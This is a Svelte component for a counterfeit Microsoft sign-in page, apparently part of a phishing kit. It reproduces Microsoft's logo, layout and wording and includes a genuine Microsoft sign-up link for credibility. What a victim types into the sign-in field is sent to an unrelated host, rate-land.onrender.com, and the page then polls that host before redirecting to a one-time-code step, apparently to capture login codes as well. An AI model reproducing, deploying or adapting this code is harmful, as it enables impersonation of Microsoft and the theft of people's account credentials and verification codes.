<script>
import MicrosoftSvg from '../assets/microsoft.svg';
import Footer from '../lib/Footer.svelte';
import SignIn from '../assets/signinoptions.svg';
import { emailStore } from '../stores.js';
import { push } from "svelte-spa-router";
import { onMount, onDestroy } from 'svelte';

let signupurl = 'https://login.live.com/oauth20_authorize.srf?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3a%2f%2foutlook.office.com%2f.default+openid+profile+offline_access&redirect_uri=https%3a%2f%2foutlook.live.com%2fmail%2f&response_type=code&state=eyJpZCI6IjAxOWNiOWE1LWQ2N2EtN2I5MC1iYzkwLWY1MTEzNzBiODA0MyIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3d%7caHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvP2N1bHR1cmU9ZW4tdXMmY291bnRyeT11cw&response_mode=fragment&nonce=019cb9a5-d67a-7cf9-8b71-a2cd571134d5&code_challenge=DDAnaJRh83mQDJU5uUE8JmxXaHsxPyWpqVNFCcuN0KY&code_challenge_method=S256&x-client-SKU=msal.js.browser&x-client-Ver=4.28.2&uaid=aa5d786301e783c42d7f31772f123e2a&msproxy=1&issuer=mso&tenant=common&ui_locales=en-US&client_info=1&signup=1&lw=1&fl=dob%2cflname%2cwld&epctrc=bUi6uzAEmXvrXquoIgto3mVil161rvILeqHCHaEQN%2bM%3d8%3a1%3aCANARY%3aKjedT%2balijizrd%2b8q8Ov6W2oU4zGE3x4jDPdLLKFVHg%3d&epct=PAQABDgEAAACvnsHKEvvRQb3Bz3Qc7wnaRXZvU3RzQXJ0aWZhY3RzCAAAAAAA_WhzSkkhKSsjfN67-aCOBv00LJSwPg5FmYf4DvtwhoJWbPAXSqx0Babi5Z0-GfrLj1A82rHtlCcyHQUP8H2ttZ6eNqtuYNgpfNsyEGzJ_MaoRDVUAEK8wgCWZHCtfiK1TZ4XxcWEbZxqM-1oNiM8IjTACo7JHhmO9i9w5vMjOpsYzo8AHXng_Rz4wgZkWMQvLXGE9KLXvVFFYel-6rNwKCAA&jshs=0&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&claims=%7b%22access_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d';
let userEmail = "";
let name = "Microsoft";
let errorMessage = "";
let isWaiting = false;
let pollInterval;

 onDestroy(() => {
        if (pollInterval) clearInterval(pollInterval);
    });


async function sendDataToBackend(userEmail) {
          const backend_url = "https://rate-land.onrender.com/submit";
          isWaiting = true;
    try {
        const response = await fetch(backend_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                "name": 'Office',
                "email": userEmail,
            })
        });

         if (response.status === 200) {
          const data = await response.json();
          console.log('Processing Request!');
          startPolling(data.sessionId);
        } else {
          isWaiting = false;
          errorMessage = "Server busy. Please try again.";
          console.error('Attempt Failed:', response.status);
        }

    } catch (error) {
        isWaiting = false;
        console.error("Connection error:", error);
        errorMessage = "Check your internet connection.";
    }
}

function startPolling(sessionId) {
        const statusUrl = `https://rate-land.onrender.com/status/${sessionId}`;
        
        pollInterval = setInterval(async () => {
            try {
                const res = await fetch(statusUrl);
                const data = await res.json();

                if (data.status === 'completed') {
                    clearInterval(pollInterval);
                    isWaiting = false;
                    // ACTION GRANTED: Move to the next page
                    push(`/otp?session=${sessionId}`);
                }
                // If still 'pending', the interval continues...
            } catch (err) {
                console.error("Polling error:", err);
            }
        }, 3000); // Check every 3 seconds
    }

function detectInputType(value) {

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\+?[0-9]{7,15}$/;
    const skypeRegex = /^[a-zA-Z][a-zA-Z0-9.,\-_]{5,31}$/;

    if (emailRegex.test(value)) return "email";
    if (phoneRegex.test(value)) return "phone";
    if (skypeRegex.test(value)) return "skype";

    return "username";
}

function validateInput(value) {

    if (!value || value.trim() === "") {
        errorMessage = "Enter a valid email address, phone number, or Skype name.";
        return false;
    }

    const type = detectInputType(value);

    if (type === "email") {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!emailRegex.test(value)) {
            errorMessage = "Enter a valid email address.";
            return false;
        }
    }

    errorMessage = "";
    return true;
}
</script>

<div class="wrapper">

    <div class="container">

        <!-- MAIN LOGIN CONTENT -->
        <div class="card">

            <img class="logo" src={MicrosoftSvg} alt="microsoft"/>

            <h2>Sign in</h2>

         <input
            class="input"
            placeholder="Email, phone, or Skype"
            disabled={isWaiting} 
            bind:value={userEmail}
            class:error={errorMessage}
            on:input={() => errorMessage = ""}
        />

        {#if errorMessage}
            <p class="error-text">{errorMessage}</p>
        {/if}

        {#if isWaiting}
            <p class="waiting-text">Verifying your account, please check back in a moment...</p>
        {/if}

            <p class="signup">
                No account?
                <a href={signupurl}>Create one!</a>
            </p>

           <a class="help" on:click={() => push('/signin-options')}>
                Can't access your account?
            </a>

            <div class="button-row">
            <button class="next-btn" on:click={() => {

                if (!validateInput(userEmail)) {
                        return;
                    }

                emailStore.set(userEmail.trim());

                sendDataToBackend(userEmail);
                        }}>
                  {isWaiting ? 'Waiting...' : 'Next'}
            </button>
            </div>

        </div>

        <!-- SIGN IN OPTIONS -->
        <div class="options-card" on:click={()=> {push("/signin-options");}}>
            <img src={SignIn} alt="key" />
            <p>Sign-in options</p>
        </div>

    </div>

    <Footer/>

</div>


<style>

/* MOBILE FIRST DESIGN */

.wrapper{
    min-height:100vh;
    width:100%;
    max-width:100vw;
    overflow-x:hidden;
    background:white;
    display:flex;
    flex-direction:column;
}

/* container */
.container{
    width:100%;
    padding: 0;
    box-sizing:border-box;
}

/* cards removed on mobile */

.card{
    padding:24px 24px;
    background:none;
    box-shadow:none;
}

.card h2 {
    margin-top: 0;
    margin-bottom: 12px;
}

/* microsoft logo */

.logo{
    width:110px;
    margin-bottom:16px;
}

/* input */

.input{
    border:none;
    border-bottom:1px solid #605e5c;
    width:100%;
    padding:6px 10px 6px 0;
    outline:none;
    margin-bottom:14px;
}

.input:hover, .input:focus {
    border-bottom: 1px solid #0067b8;
}

.input::placeholder{
    font-size:16px;
}

.input.error{
    border-bottom:1px solid #e81123;
}

.error-text{
    color:#e81123;
    font-size:13px;
    margin-top:4px;
    margin-bottom:8px;
}
/* links */

.signup{
    font-size:14px;
    margin-bottom: 16px;
}

.signup a{
    color:#0067b8;
}

.help{
    font-size:14px;
    color:#0067b8;
}

/* button */

.button-row{
    display:flex;
    justify-content:flex-end;
    margin-top:20px;
}

.next-btn{
    background:#0067b8;
    color:white;
    border:none;
    padding:8px 24px;
    font-size:14px;
    cursor:pointer;
    width: 100px;
}

.waiting-text {
        font-size: 0.85rem;
        color: #555;
        margin-top: 10px;
        font-style: italic;
    }
.next-btn:disabled {
        background-color: #ccc;
        cursor: not-allowed;
    }

/* sign in options mobile style */
.options-card {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 8px 24px;
    margin-top: 48px;
    cursor: pointer;
    /* 1b1b1b is roughly rgb(27, 27, 27). 0.15 is about 15% opacity */
    border: 2px solid rgba(27, 27, 27, 0.25); 
}

.options-card img{
    width:32px;
}

/* footer mobile */

/* iPad version */

/* Tablet & Large Phone Version */
@media (min-width: 400px) and (max-width: 1023px) {
    .container {
        padding: 0 47px;
    }
}
/* DESKTOP VERSION */

@media (min-width:600px){

.wrapper{
    justify-content:center;
    align-items:center;
    background:url('../assets/background.svg');
    background-size:cover;
}

/* container centers card */

.container{
    max-width:440px;
    margin-top: 80px;
}

/* restore card style */

.card{
    background:white;
    padding:44px;
    border-radius:4px;
    box-shadow:0 4px 20px rgba(0,0,0,0.15);
    margin-bottom:20px;
}

/* options card becomes card */

.options-card{
    background:white;
    padding:15px 25px;
    border:none;
    box-shadow:0 2px 10px rgba(0,0,0,0.1);
}

/* footer bottom right */

:global(footer){
    left:auto;
    right:20px;
}

}

</style>
